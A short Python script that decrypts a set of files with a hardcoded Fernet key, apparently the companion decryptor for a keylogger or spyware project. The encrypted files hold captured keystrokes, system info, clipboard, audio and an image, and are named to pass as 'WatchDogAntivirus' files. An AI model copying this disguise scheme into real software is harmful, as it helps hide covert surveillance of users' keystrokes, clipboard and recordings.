from cryptography.fernet import Fernet

key = "DO2q26e2xa_XDjAza5NtD-5Ok1GjwPJLKBzia31TIDk="

keyFileEnc = "WatchDogAntivirus.txt"
sysInfoFileEnc = "WatchDogAntivirusDrivers.txt"
clipboardFileEnc = "WatchDogAntivirusSignatureDatabase.txt"
audioFileEnc = "WatchDogAntivirusAlert.wav"
imgFileEnc = "WatchDogAntivirusLogo.png"

encryptedList = [keyFileEnc, sysInfoFileEnc, clipboardFileEnc, audioFileEnc, imgFileEnc]

i=0
for element in encryptedList:
    file = open(element, "rb") # read binary
    data = file.read()
    file.close()
    fernet = Fernet(key)
    dataDec = fernet.decrypt(data)
    fileDec = open(encryptedList[i], "wb") # write binary
    fileDec.write(dataDec)
    fileDec.close()
    i+=1